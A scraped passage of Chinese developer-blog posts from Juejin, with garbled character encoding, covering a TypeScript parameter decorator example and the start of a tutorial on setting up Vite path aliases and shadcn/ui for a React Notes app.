<h3 data-id="heading-10">4.5å‚æ•°è£…é¥°å™¨</h3>
<p>å‚æ•°è£…é¥°å™¨å£°æ˜åœ¨ä¸€ä¸ªå‚æ•°å£°æ˜ä¹‹å‰ï¼ˆç´§é ç€å‚æ•°å£°æ˜ï¼‰ã€‚ å‚æ•°è£…é¥°å™¨åº”ç”¨äºç±»æ„é€ å‡½æ•°æˆ–æ–¹æ³•å£°æ˜ã€‚ å‚æ•°è£…é¥°å™¨ä¸èƒ½ç”¨åœ¨å£°æ˜æ–‡ä»¶ï¼ˆ.d.tsï¼‰ï¼Œé‡è½½æˆ–å…¶å®ƒå¤–éƒ¨ä¸Šä¸‹æ–‡ï¼ˆæ¯”å¦‚ declareçš„ç±»ï¼‰é‡Œã€‚</p>
<p>å‚æ•°è£…é¥°å™¨è¡¨è¾¾å¼ä¼šåœ¨è¿è¡Œæ—¶å½“ä½œå‡½æ•°è¢«è°ƒç”¨ï¼Œä¼ å…¥ä¸‹åˆ—3ä¸ªå‚æ•°ï¼š</p>
<ol>
<li>å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ˜¯ç±»çš„åŸå‹å¯¹è±¡ã€‚</li>
<li>æˆå‘˜çš„åå­—ã€‚</li>
<li>å‚æ•°åœ¨å‡½æ•°å‚æ•°åˆ—è¡¨ä¸­çš„ç´¢å¼•ã€‚</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logParam</span>(<span class="hljs-params">target: any, propertyKey: string | symbol | <span class="hljs-literal">undefined</span>, parameterIndex: number</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‚æ•°è£…é¥°å™¨: æ–¹æ³• <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span> çš„ç¬¬ <span class="hljs-subst">${parameterIndex}</span> ä¸ªå‚æ•°è¢«æ ‡è®°`</span>);
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-title function_">add</span>(@logParam <span class="hljs-attr">a</span>: number, @logParam <span class="hljs-attr">b</span>: number): number {
        <span class="hljs-keyword">return</span> a + b;
    }
}

<span class="hljs-keyword">const</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-title function_">add</span>(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 8</span>
</code></pre>
<h2 data-id="heading-11">5ã€åŸç†ï¼ˆTODOï¼‰</h2>
<blockquote>
<p>è£…é¥°å™¨æœ¬è´¨å°±æ˜¯è¯­æ³•ç³–ï¼Œåœ¨ç¼–è¯‘æ—¶è½¬æ¢ä¸ºæ™®é€šå‡½æ•°è°ƒç”¨è€Œå·²</p>
</blockquote>
<h2 data-id="heading-12">å‚è€ƒé“¾æ¥</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.tslang.cn%2Fdocs%2Fhandbook%2Fdecorators.html" target="_blank" title="https://www.tslang.cn/docs/handbook/decorators.html" ref="nofollow noopener noreferrer">TypeScriptä¸­æ–‡ç½‘</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ AI å…¨æ ˆé¡¹ç›®ç¬¬äº”å¤©ï¼šç”¨ shadcn/ui æ‰“é€ é«˜é¢œå€¼ React åº”ç”¨ & å®æˆ˜ Notes é¡¹ç›®]]></title>    <link>https://juejin.cn/post/7596883689827795007</link>    <guid>https://juejin.cn/post/7596883689827795007</guid>    <pubDate>2026-01-19T17:33:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689827795007" data-draft-id="7596883689827762239" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ AI å…¨æ ˆé¡¹ç›®ç¬¬äº”å¤©ï¼šç”¨ shadcn/ui æ‰“é€ é«˜é¢œå€¼ React åº”ç”¨ &amp; å®æˆ˜ Notes é¡¹ç›®"/> <meta itemprop="keywords" content="TypeScript,React.js,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2026-01-19T17:33:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥ç§˜çš„çŒªå¤´"/> <meta itemprop="url" content="https://juejin.cn/user/793223472877051"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ AI å…¨æ ˆé¡¹ç›®ç¬¬äº”å¤©ï¼šç”¨ shadcn/ui æ‰“é€ é«˜é¢œå€¼ React åº”ç”¨ &amp; å®æˆ˜ Notes é¡¹ç›®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793223472877051/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥ç§˜çš„çŒªå¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:33:34.000Z" title="Mon Jan 19 2026 17:33:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼ğŸ‘‹ æ¬¢è¿å›åˆ° <strong>AI å…¨æ ˆé¡¹ç›®å®æˆ˜</strong> çš„ç¬¬äº”å¤©ã€‚</p>
<p>åœ¨è¿‡å»å‡ å¤©çš„â€œç‰¹ç§å…µå¼â€è®­ç»ƒä¸­ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº† React çš„â€œæ—¶ç©ºç©¿æ¢­æœ¯â€ï¼ˆRouter è·¯ç”±ï¼‰ï¼Œè¯·æ¥äº†å¾·å›½ç®¡å®¶ï¼ˆZustand çŠ¶æ€ç®¡ç†ï¼‰ï¼Œç©¿ä¸Šäº† TypeScript çš„é’¢é“ä¾ æˆ˜è¡£ï¼Œè¿˜å­¦ä¼šäº†ç”¨ NestJS æ­å»ºåç«¯çš„â€œç²¾è£…è±ªå®…â€ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬è¦æŠŠè¿™äº›é›¶æ•£çš„å®çŸ³ä¸²æˆä¸€æ¡é¡¹é“¾ã€‚æˆ‘ä»¬è¦å¼€å§‹å®æˆ˜äº†ï¼æˆ‘ä»¬å°†ä»é›¶å¼€å§‹æ­å»ºä¸€ä¸ªç§»åŠ¨ç«¯çš„ <strong>Notesï¼ˆç¬”è®°ï¼‰åº”ç”¨</strong>ã€‚</p>
<p>è€Œä¸”ï¼Œä»Šå¤©æˆ‘è¦å‘å¤§å®¶ä»‹ç»ä¸€ä½å‰ç«¯ UI ç•Œçš„æ–°æ™‹â€œé¡¶æµâ€ â€”â€” <strong>shadcn/ui</strong>ã€‚å¦‚æœä½ å—å¤Ÿäº† Material UI æˆ–è€… Ant Design é‚£ç§â€œåƒç¯‡ä¸€å¾‹â€çš„æ ·å¼ï¼Œshadcn/ui ç»å¯¹ä¼šè®©ä½ æ‰“å¼€æ–°ä¸–ç•Œçš„å¤§é—¨ã€‚å®ƒæ˜¯ç›®å‰ React ç”Ÿæ€ä¸­æœ€ç«çš„ç»„ä»¶åº“æ–¹æ¡ˆï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚</p>
<p>å‡†å¤‡å¥½äº†å—ï¼Ÿæˆ‘ä»¬è¦å‘è½¦äº†ï¼ğŸš—</p>
<hr/>
<h2 data-id="heading-0">ğŸ› ï¸ ä¸€ã€ ç£¨åˆ€ä¸è¯¯ç æŸ´å·¥ï¼šä¼˜é›…çš„é¡¹ç›®é…ç½®</h2>
<p>åœ¨å¼€å§‹å†™ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆè§£å†³å‡ ä¸ªâ€œé•¿æœŸç—›ç‚¹â€ã€‚ä½ æ˜¯ä¸æ˜¯ç»å¸¸åœ¨ä»£ç é‡Œçœ‹åˆ°è¿™æ ·çš„è·¯å¾„ï¼š
<code>import Button from '../../../../components/Button'</code>
è¿™ç§ <code>../../</code> çš„åœ°ç‹±ä¸ä»…éš¾çœ‹ï¼Œè€Œä¸”ä¸€æ—¦ä½ ç§»åŠ¨äº†æ–‡ä»¶ä½ç½®ï¼Œå¼•ç”¨çš„è·¯å¾„å…¨éƒ½è¦ç‚¸ã€‚</p>
<h3 data-id="heading-1">1.1 è·¯å¾„åˆ«åï¼ˆPath Aliasï¼‰ï¼šè®© <code>@</code> å¸¦ä½ å›å®¶</h3>
<p>æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœæ˜¯ï¼šæ— è®ºä½ åœ¨å“ªä¸ªæ·±å±‚ç›®å½•ä¸‹ï¼Œåªè¦è¾“å…¥ <code>@/</code>ï¼Œå°±ä»£è¡¨å›åˆ°äº† <code>src</code> æ ¹ç›®å½•ã€‚ç¼–è¾‘å™¨è¿˜èƒ½æ™ºèƒ½æç¤ºç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ Vite çš„é…ç½®æ–‡ä»¶ <code>vite.config.ts</code>ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-react'</span>
<span class="hljs-keyword">import</span> tailwindcss <span class="hljs-keyword">from</span> <span class="hljs-string">'@tailwindcss/vite'</span>
<span class="hljs-comment">// 1ï¸âƒ£ å¼•å…¥ node çš„ path æ¨¡å—</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span> 

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">react</span>(),
    <span class="hljs-title function_">tailwindcss</span>()
  ],
  <span class="hljs-comment">// 2ï¸âƒ£ é…ç½® resolve.alias</span>
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-comment">// __dirname æ˜¯ Node.js çš„è¶…çº§å˜é‡ï¼Œä»£è¡¨å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span>
      <span class="hljs-comment">// path.resolve è´Ÿè´£æ‹¼æ¥è·¯å¾„</span>
      <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src'</span>),
    },
  }
})
</code></pre>
<p><strong>ğŸ’¡ çŸ¥è¯†ç‚¹è§£æï¼š</strong></p>
<ul>
<li><strong><code>path</code> æ¨¡å—</strong>ï¼šè¿™æ˜¯ Node.js çš„å†…ç½®æ¨¡å—ï¼Œä¸“é—¨ç”¨æ¥å¤„ç†æ–‡ä»¶è·¯å¾„çš„ã€‚</li>
<li><strong><code>__dirname</code></strong>ï¼šè¿™æ˜¯ Node.js çš„å…¨å±€å˜é‡ï¼ŒæŒ‡å‘å½“å‰æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ç›®å½•ã€‚</li>
<li><strong>TS æŠ¥é”™ï¼Ÿ</strong>ï¼šå½“ä½ å†™ <code>import path from 'path'</code> æ—¶ï¼ŒTypeScript å¯èƒ½ä¼šæŠ¥é”™è¯´æ‰¾ä¸åˆ°æ¨¡å—ã€‚è¿™æ˜¯å› ä¸º TS é»˜è®¤ä¸çŸ¥é“ Node.js çš„å†…ç½®æ¨¡å—ã€‚
<ul>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šæˆ‘ä»¬éœ€è¦å®‰è£… Node çš„ç±»å‹å£°æ˜æ–‡ä»¶ã€‚</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">npm i -D @types/node
</code></pre>
<em>è¿™è¡Œå‘½ä»¤æ˜¯å‘Šè¯‰ TSï¼šâ€œå˜¿ï¼Œåˆ«æ…Œï¼Œæˆ‘çŸ¥é“ path æ˜¯å•¥ï¼Œè¿™æ˜¯å®ƒçš„è¯´æ˜ä¹¦ã€‚â€</em></li>
</ul>
<p>é…ç½®å®Œ Vite è¿˜æ²¡å®Œï¼Œæˆ‘ä»¬è¿˜å¾—å‘Šè¯‰ TypeScript è¿™ä¸ª <code>@</code> æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå¦åˆ™ TS ç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚
æ‰“å¼€ <code>tsconfig.app.json</code>ï¼ˆæˆ–è€… <code>tsconfig.json</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// ... å…¶ä»–é…ç½®</span>
    
    <span class="hljs-comment">/* è·¯å¾„é…ç½® */</span>
    <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"."</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// åŸºå‡†ç›®å½•æ˜¯å½“å‰ç›®å½•</span>
    <span class="hljs-attr">"paths"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"@/*"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/*"</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// å‘Šè¯‰ TSï¼šé‡åˆ° @/ å¼€å¤´çš„è·¯å¾„ï¼Œå» src/ ä¸‹é¢æ‰¾</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å½»åº•å‘Šåˆ«äº† <code>../../</code> çš„å™©æ¢¦ï¼Œè¿æ¥äº†æ¸…çˆ½çš„ <code>@/components/Header</code>ã€‚</p>
<hr/>
<h2 data-id="heading-2">ğŸ¨ äºŒã€ UI ç•Œçš„â€œä¹é«˜â€ï¼šshadcn/ui åˆä½“éªŒ</h2>
<h3 data-id="heading-3">2.1 ä¸ºä»€ä¹ˆæ˜¯ shadcn/uiï¼Ÿ</h3>
<p>ä¼ ç»Ÿçš„ç»„ä»¶åº“ï¼ˆå¦‚ Antd, MUIï¼‰æ˜¯æŠŠç»„ä»¶å°è£…åœ¨ä¸€ä¸ªé»‘ç›’å­é‡Œï¼ˆnpm åŒ…ï¼‰ï¼Œä½ åªèƒ½é€šè¿‡ä¿®æ”¹ props æ¥æ”¹å˜æ ·å¼ã€‚å¦‚æœä½ æƒ³å¤§æ”¹ç»“æ„ï¼Ÿæ²¡é—¨ã€‚</p>
<p><strong>shadcn/ui</strong> çš„ç†å¿µå®Œå…¨ä¸åŒã€‚å®ƒ<strong>ä¸æ˜¯</strong>ä¸€ä¸ªç»„ä»¶åº“ï¼Œå®ƒæ˜¯ä¸€ä¸ª<strong>ç»„ä»¶é›†åˆ</strong>ã€‚
å½“ä½ éœ€è¦ä¸€ä¸ª Button æ—¶ï¼Œå®ƒä¸æ˜¯è®©ä½  <code>npm install @shadcn/button</code>ï¼Œè€Œæ˜¯<strong>ç›´æ¥æŠŠ Button ç»„ä»¶çš„æºä»£ç ä¸‹è½½åˆ°ä½ çš„é¡¹ç›®ä¸­</strong>ï¼ˆé€šå¸¸æ˜¯ <code>src/components/ui</code> ç›®å½•ä¸‹ï¼‰ã€‚</p>
<p>è¿™æ„å‘³ç€ï¼š<strong>ä½ æ‹¥æœ‰è¿™äº›ç»„ä»¶çš„å®Œå…¨æ§åˆ¶æƒ</strong>ã€‚ä½ å¯ä»¥éšæ„ä¿®æ”¹å®ƒçš„ä»£ç ã€æ ·å¼ã€é€»è¾‘ã€‚å®ƒåŸºäº <strong>Tailwind CSS</strong> æ„å»ºï¼Œæ ·å¼ä¿®æ”¹æå…¶æ–¹ä¾¿ã€‚</p>
<h3 data-id="heading-4">2.2 åˆå§‹åŒ– shadcn/ui</h3>
<p>é¦–å…ˆï¼Œç¡®ä¿ä½ çš„é¡¹ç›®å·²ç»å®‰è£…å¹¶é…ç½®å¥½äº† Tailwind CSSï¼ˆå¦‚æœä¸è®°å¾—äº†ï¼Œè¯·å¤ä¹ ä¹‹å‰çš„æ–‡ç« ï¼‰ã€‚
ç„¶åï¼Œåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹è¿è¡Œåˆå§‹åŒ–å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npx shadcn@latest init
</code></pre>
<p><strong>ğŸ’¡ çŸ¥è¯†ç‚¹è§£æï¼šnpx æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li><code>npm</code> æ˜¯åŒ…ç®¡ç†å·¥å…·ï¼ˆå®‰è£…ã€å¸è½½ï¼‰ã€‚</li>
<li><code>npx</code> æ˜¯åŒ…<strong>æ‰§è¡Œ</strong>å·¥å…·ã€‚</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼šå®ƒä¸éœ€è¦ä½ å…¨å±€å®‰è£… <code>shadcn</code>ã€‚å®ƒä¼šä¸´æ—¶ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ <code>shadcn</code>ï¼Œæ‰§è¡Œå®Œå‘½ä»¤åå°±åˆ é™¤ã€‚éå¸¸é€‚åˆè¿™ç§â€œä¸€æ¬¡æ€§â€çš„åˆå§‹åŒ–æ“ä½œï¼Œè€Œä¸”æ°¸è¿œç”¨çš„éƒ½æ˜¯æœ€æ–°ç‰ˆã€‚</li>
</ul>
<p>æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šé—®ä½ ä¸€äº›é—®é¢˜ï¼ˆæ¯”å¦‚ç”¨ä»€ä¹ˆé¢œè‰²ä¸»é¢˜ã€CSS å˜é‡å­˜åœ¨å“ªï¼‰ï¼Œä¸€è·¯å›è½¦é€‰æ‹©é»˜è®¤å³å¯ã€‚å®ƒä¼šè‡ªåŠ¨æ£€æµ‹ä½ çš„ <code>tsconfig.json</code> é‡Œçš„åˆ«åé…ç½®ï¼ˆåˆšæ‰æˆ‘ä»¬é…çš„ <code>@</code>ï¼‰ï¼Œéå¸¸æ™ºèƒ½ã€‚</p>
<h3 data-id="heading-5">2.3 æ·»åŠ ä½ çš„ç¬¬ä¸€ä¸ªç»„ä»¶</h3>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬æƒ³è¦ä¸€ä¸ªæ¼‚äº®çš„æŒ‰é’®ã€‚
åœ¨ç»ˆç«¯è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npx shadcn@latest add button
</code></pre>
<p>ä½ ä¼šå‘ç°ï¼Œä½ çš„ <code>src/components/ui</code> ç›®å½•ä¸‹å¤šäº†ä¸€ä¸ª <code>button.tsx</code> æ–‡ä»¶ã€‚
è¿™å°±æ˜¯ shadcn çš„é­”åŠ›ï¼ä»£ç å°±åœ¨ä½ æ‰‹é‡Œï¼Œæƒ³æ€ä¹ˆæ”¹å°±æ€ä¹ˆæ”¹ã€‚</p>
<p>è®©æˆ‘ä»¬åœ¨ <code>App.tsx</code> é‡Œè¯•ä¸€ä¸‹ï¼ˆä¼ªä»£ç ï¼‰ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/button'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"default"</span>&gt;</span>æˆ‘æ˜¯é»˜è®¤æŒ‰é’®<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"destructive"</span>&gt;</span>æˆ‘æ˜¯å±é™©æŒ‰é’®<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span>&gt;</span>æˆ‘æ˜¯æè¾¹æŒ‰é’®<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<p>ç®€ç›´å¤ªä¼˜é›…äº†ï¼ä½ ä¸éœ€è¦å†™ä¸€è¡Œ CSSï¼Œå°±æ‹¥æœ‰äº†ä¼ä¸šçº§è®¾è®¡çš„æŒ‰é’®ã€‚</p>
<hr/>
<h2 data-id="heading-6">ğŸ—ï¸ ä¸‰ã€ é¡¹ç›®å®æˆ˜ï¼šNotes åº”ç”¨æ¶æ„è®¾è®¡</h2>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ­£å¼å¼€å§‹æ­å»º <strong>Notes</strong> é¡¹ç›®ã€‚</p>
<h3 data-id="heading-7">3.1 ç›®å½•ç»“æ„</h3>
<p>æœ‰äº†è·¯å¾„åˆ«åï¼Œæˆ‘ä»¬çš„ç›®å½•ç»“æ„å¯ä»¥éå¸¸æ¸…æ™°ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">src/
â”œâ”€â”€ components/     <span class="hljs-comment"># å…¬å…±ç»„ä»¶</span>
â”‚   â”œâ”€â”€ ui/         <span class="hljs-comment"># shadcn ä¸‹è½½çš„ç»„ä»¶</span>
â”‚   â”œâ”€â”€ Header.tsx  <span class="hljs-comment"># è‡ªå·±å†™çš„ä¸šåŠ¡ç»„ä»¶</span>
â”‚   â””â”€â”€ ...
â”œâ”€â”€ layouts/        <span class="hljs-comment"># å¸ƒå±€ç»„ä»¶</span>
â”‚   â””â”€â”€ MainLayout.tsx
â”œâ”€â”€ pages/          <span class="hljs-comment"># é¡µé¢ç»„ä»¶</span>
â”‚   â”œâ”€â”€ Home.tsx
â”‚   â”œâ”€â”€ Login.tsx
â”‚   â”œâ”€â”€ Mine.tsx
â”‚   â””â”€â”€ ...
â”œâ”€â”€ router/         <span class="hljs-comment"># è·¯ç”±é…ç½®</span>
â”‚   â””â”€â”€ index.tsx
â”œâ”€â”€ store/          <span class="hljs-comment"># Zustand çŠ¶æ€ç®¡ç†</span>
â”‚   â””â”€â”€ useUserStore.ts
â”œâ”€â”€ types/          <span class="hljs-comment"># TS ç±»å‹å®šä¹‰</span>
â”œâ”€â”€ App.tsx         <span class="hljs-comment"># æ ¹ç»„ä»¶</span>
â””â”€â”€ main.tsx        <span class="hljs-comment"># å…¥å£æ–‡ä»¶</span>
</code></pre>
<h3 data-id="heading-8">3.2 è·¯ç”±æ¶æ„ï¼šApp è¿˜æ˜¯ Mainï¼Ÿ</h3>
<p>è¿™é‡Œæœ‰ä¸ªå…³é”®çš„æ¶æ„è®¾è®¡ç‚¹ã€‚
